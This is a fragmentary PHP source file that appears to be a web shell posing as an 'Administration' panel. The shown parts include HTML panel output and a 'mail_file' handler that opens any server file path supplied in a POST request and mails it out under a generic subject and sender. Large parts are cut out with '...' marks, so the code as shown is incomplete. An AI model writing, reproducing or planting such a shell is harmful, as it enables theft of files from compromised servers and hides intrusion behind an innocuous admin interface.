...
echo $head;
echo '</head>';
echo '<body><table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc width=160><font face=Verdana size=2>'.ws(2).'<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'Administration'.'</b></font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';
...
if(!empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 ...
 if(!$file=@fopen($_POST['loc_file'],"r")) { err(1,$_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    ...
    if(empty($_POST['subj'])) { $_POST['subj'] = 'File from me'; }
    if(empty($_POST['from'])) { $_POST['from'] = 'admin@site.com'; }
...
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ Administration | version ".$version." ]---o</b></font></div></td></tr></table>";
echo '</body></html>';
?>